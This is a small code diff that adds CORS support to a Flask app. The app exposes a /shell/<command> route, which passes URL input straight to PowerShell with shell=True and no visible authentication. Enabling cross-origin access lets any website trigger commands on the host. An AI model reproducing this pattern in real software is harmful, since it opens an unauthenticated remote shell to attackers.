@@ -1,5 +1,6 @@
 import subprocess
 from flask import Flask
+from flask_cors import CORS
 
 def formatOut(res):
     res = res[2:len(res)]
@@ -18,6 +19,7 @@ def runCommand(cmd):
     return subprocess.check_output(["C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe", cmd], shell=True)
 
 app = Flask(__name__)
+CORS(app)
 
 @app.route("/shell/<command>")
 def sendCommand(command):
